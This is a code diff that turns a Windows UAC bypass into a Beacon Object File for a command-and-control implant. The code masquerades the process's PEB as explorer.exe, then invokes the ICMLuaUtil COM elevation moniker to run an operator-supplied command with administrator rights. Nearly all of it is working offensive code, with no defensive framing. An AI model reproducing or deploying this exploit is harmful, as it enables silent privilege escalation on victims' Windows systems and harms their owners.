@@ -141,6 +141,7 @@
 #pragma comment(lib, "Mfplat.lib")
 #pragma comment(lib, "User32.lib")
 #pragma comment(lib, "Ntdll.lib")
+#pragma comment(lib, "NtosKrnl.lib")
 
 /**
  * ICMLuaUtil VTBL interface
@@ -189,7 +190,7 @@ void* NtGetPeb() {
  * @return int Zero if succesfully executed, any other integer otherwise.
  */
 int masqueradePEB() {
-    puts("[+] \t- Defining local structs.");
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] \t- Defining local structs.");
 
     /**
      * Define local PEB LDR DATA
@@ -282,21 +283,44 @@ int masqueradePEB() {
         };
     } LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;
 
-    puts("[+] \t- Getting 'explorer.exe' path.");
+    typedef NTSTATUS(NTAPI* _RtlEnterCriticalSection) (PRTL_CRITICAL_SECTION CriticalSection);
+    typedef NTSTATUS(NTAPI* _RtlLeaveCriticalSection) (PRTL_CRITICAL_SECTION CriticalSection);
+    typedef void (WINAPI* _RtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
+
+    _RtlEnterCriticalSection RtlEnterCriticalSection = (_RtlEnterCriticalSection) KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleW(L"ntdll.dll"), "RtlEnterCriticalSection");
+    if (RtlEnterCriticalSection == NULL) {
+        BeaconPrintf(CALLBACK_ERROR, "[!] Could not find RtlEnterCriticalSection.");
+        return 1;
+    }
+
+    _RtlLeaveCriticalSection RtlLeaveCriticalSection = (_RtlLeaveCriticalSection) KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleW(L"ntdll.dll"), "RtlLeaveCriticalSection");
+    if (RtlLeaveCriticalSection == NULL) {
+        BeaconPrintf(CALLBACK_ERROR, "[!] Could not find RtlLeaveCriticalSection.");
+        return 1;
+    }
+
+    _RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString) KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleW(L"ntdll.dll"), "RtlInitUnicodeString");
+    if (RtlInitUnicodeString == NULL) {
+        BeaconPrintf(CALLBACK_ERROR, "[!] Could not find RtlInitUnicodeString.");
+        return 1;
+    }
+
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] \t- Getting 'explorer.exe' path.");
     WCHAR chExplorerPath[MAX_PATH];
     KERNEL32$GetWindowsDirectoryW(chExplorerPath, MAX_PATH);
     MSVCRT$wcscat_s(chExplorerPath, sizeof(chExplorerPath) / sizeof(wchar_t), L"\\explorer.exe");
-    LPWSTR pwExplorerPath = (LPWSTR) malloc(MAX_PATH);
+    LPWSTR pwExplorerPath = (LPWSTR) MSVCRT$malloc(MAX_PATH);
     MSVCRT$wcscpy_s(pwExplorerPath, MAX_PATH, chExplorerPath);
 
-    puts("[+] \t- Getting current PEB.");
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] \t- Getting current PEB.");
     PEB* peb = (PEB*) NtGetPeb();
 
-    NTOSKRNL$RtlEnterCriticalSection(peb->FastPebLock);
+    RtlEnterCriticalSection(peb->FastPebLock);
 
-    puts("[+] \t- Masquerading ImagePathName and CommandLine.");
-    NTOSKRNL$RtlInitUnicodeString(&peb->ProcessParameters->ImagePathName, chExplorerPath);
-    NTOSKRNL$RtlInitUnicodeString(&peb->ProcessParameters->CommandLine, chExplorerPath);
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] \t- Masquerading ImagePathName and CommandLine.");
+
+    RtlInitUnicodeString(&peb->ProcessParameters->ImagePathName, chExplorerPath);
+    RtlInitUnicodeString(&peb->ProcessParameters->CommandLine, chExplorerPath);
 
     PLDR_DATA_TABLE_ENTRY pStartModuleInfo = (PLDR_DATA_TABLE_ENTRY) peb->Ldr->InLoadOrderModuleList.Flink;
     PLDR_DATA_TABLE_ENTRY pNextModuleInfo = (PLDR_DATA_TABLE_ENTRY) peb->Ldr->InLoadOrderModuleList.Flink;
@@ -305,17 +329,17 @@ int masqueradePEB() {
     KERNEL32$GetModuleFileNameW(NULL, wExeFileName, MAX_PATH);
 
     do {
-        if (_wcsicmp(wExeFileName, pNextModuleInfo->FullDllName.Buffer) == 0) {
-            puts("[+] \t- Masquerading FullDllName and BaseDllName.");
-            NTOSKRNL$RtlInitUnicodeString(&pNextModuleInfo->FullDllName, pwExplorerPath);
-            NTOSKRNL$RtlInitUnicodeString(&pNextModuleInfo->BaseDllName, pwExplorerPath);
+        if (MSVCRT$_wcsicmp(wExeFileName, pNextModuleInfo->FullDllName.Buffer) == 0) {
+            BeaconPrintf(CALLBACK_OUTPUT, "[+] \t- Masquerading FullDllName and BaseDllName.");
+            RtlInitUnicodeString(&pNextModuleInfo->FullDllName, pwExplorerPath);
+            RtlInitUnicodeString(&pNextModuleInfo->BaseDllName, pwExplorerPath);
             break;
         }
 
         pNextModuleInfo = (PLDR_DATA_TABLE_ENTRY) pNextModuleInfo->InLoadOrderLinks.Flink;
     } while (pNextModuleInfo != pStartModuleInfo);
 
-    NTOSKRNL$RtlLeaveCriticalSection(peb->FastPebLock);
+    RtlLeaveCriticalSection(peb->FastPebLock);
     return 0;
 }
 
@@ -326,9 +350,9 @@ int masqueradePEB() {
  * @return char* The string representation.
  */
 char* StringFromResult(HRESULT result) {
-    char* message = calloc(100, sizeof(char));
+    char* message = MSVCRT$calloc(100, sizeof(char));
 
-    if (KERNEL32$FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, NULL, result, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), message, 100, NULL) == 0) {
+    if (KERNEL32$FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, result, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), message, 100, NULL) == 0) {
         message = "UNKNOWN";
         return message;
     }
@@ -339,43 +363,49 @@ char* StringFromResult(HRESULT result) {
 /**
  * Invoke COM object elevation and command execution.
  *
+ * @param char* command The command to execute.
  * @return int Zero if succesfully executed, any other integer otherwise.
  */
-int invokeComElevation() {
+int invokeComElevation(char* command) {
     HRESULT hResult = E_FAIL;
     ICMLuaUtil* pICMLuaUtil = NULL;
 
     do {
-        puts("[+] \t- IIDFromString.");
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] \t- IIDFromString.");
         IID hIID_ICMLuaUtil;
         if (OLE32$IIDFromString(L"{6EDD6D74-C007-4E75-B76A-E5740995E24C}", &hIID_ICMLuaUtil) != S_OK) {
-            puts("[!] Could not get IID from ICMLuaUtil GUID.");
+            BeaconPrintf(CALLBACK_ERROR, "[!] Could not get IID from ICMLuaUtil GUID.");
             break;
         }
 
-        puts("[+] \t- Initializing BIND_OPTS3.");
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] \t- Initializing BIND_OPTS3.");
         BIND_OPTS3 hBindOpts;
-        NTOSKRNL$RtlSecureZeroMemory(&hBindOpts, sizeof(hBindOpts));
+        // NTDLL$SecureZeroMemory(&hBindOpts, sizeof(hBindOpts));
+        MSVCRT$memset(&hBindOpts, 0, sizeof(hBindOpts));
+
         hBindOpts.cbStruct = sizeof(hBindOpts);
         hBindOpts.dwClassContext = CLSCTX_LOCAL_SERVER;
 
-        puts("[+] \t- CoInitialize.");
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] \t- CoInitialize.");
         OLE32$CoInitialize(NULL);
 
-        puts("[+] \t- CoGetObject.");
-        hResult = CoGetObject(L"Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}", (BIND_OPTS*) &hBindOpts, &hIID_ICMLuaUtil, &pICMLuaUtil);
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] \t- CoGetObject.");
+        hResult = OLE32$CoGetObject(L"Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}", (BIND_OPTS*) &hBindOpts, &hIID_ICMLuaUtil, (void**) &pICMLuaUtil);
         if (hResult != S_OK) {
-            printf("[!] \t- Could not perform CoGetObject: %x, %s.\n", hResult, StringFromResult(hResult));
+            BeaconPrintf(CALLBACK_ERROR, "[!] \t- Could not perform CoGetObject: %x, %s.\n", hResult, StringFromResult(hResult));
             break;
         }
 
-        hResult = pICMLuaUtil->lpVtbl->ShellExec(pICMLuaUtil, (LPCSTR) L"c:\\windows\\system32\\cmd.exe", NULL, NULL, SEE_MASK_DEFAULT, SW_SHOW);
+        wchar_t* wCommand = MSVCRT$calloc(MSVCRT$strlen(command), sizeof(wchar_t));
+        MSVCRT$mbstowcs(wCommand, command, MSVCRT$strlen(command));
+
+        hResult = pICMLuaUtil->lpVtbl->ShellExec(pICMLuaUtil, (LPCSTR) wCommand, NULL, NULL, SEE_MASK_DEFAULT, SW_SHOW);
         if (hResult != S_OK) {
-            puts("[!] \t- Could not perform ShellExec.");
+            BeaconPrintf(CALLBACK_ERROR, "[!] \t- Could not perform ShellExec.");
             break;
         }
 
-        puts("[+] \t- Succesfully executed shell.");
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] \t- Succesfully executed shell.");
     } while (false);
 
     if (pICMLuaUtil != NULL) {
@@ -388,39 +418,26 @@ int invokeComElevation() {
 /**
  * Perform the UAC bypass.
  *
+ * @param char* command The command to execute.
  * @return int Zero if succesfully executed, any other integer otherwise.
  */
-int boot() {
-    puts("[+] Booting.");
+int boot(char* command) {
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Trying command %s.", command);
 
-    puts("[+] Masquerading PEB.");
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Masquerading PEB.");
     if (masqueradePEB() != 0) {
-        puts("[!] Could not masquerade PEB.");
+        BeaconPrintf(CALLBACK_ERROR, "[!] Could not masquerade PEB.");
         return 1;
     }
 
-    puts("[+] Invoking COM elevation.");
-    if (invokeComElevation() != 0) {
-        puts("[!] Could not invoke UAC bypass.");
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Invoking COM elevation.");
+    if (invokeComElevation(command) != 0) {
+        BeaconPrintf(CALLBACK_ERROR, "[!] Could not invoke UAC bypass.");
         return 1;
     }
 
-    puts("[+] Done!");
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Done!");
     return 0;
-}
-
-/**
- * Exported DllMain
- * 
- * Main function ran if this PE is loaded as a library
- * 
- * @param HINSTANCE hinstDLL Unknown
- * @param DWORD fdwReason Unknown
- * @param LPVOID lpvReserved Unknown
- * @return bool Positive if executed succesfully
- */
-__declspec(dllexport) bool WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
-    return boot() == 0;
 }
 
 /**
@@ -432,16 +449,9 @@ __declspec(dllexport) bool WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, L
  * @param int length The length of the array of arguments.
  */
 void go(char* args, int length) {
-    boot();
-}
+    datap  parser;
+    char* command;
 
-/**
- * Test the UAC bypass code
- *
- * @param int argc Amount of arguments in argv.
- * @param char** Array of arguments passed to the program.
- * @return int Zero if succesfully executed, any other integer otherwise.
- */
-int main(int argc, char** argv) {
-    return boot();
+    BeaconDataParse(&parser, args, length);
+    boot(BeaconDataExtract(&parser, NULL));
 }
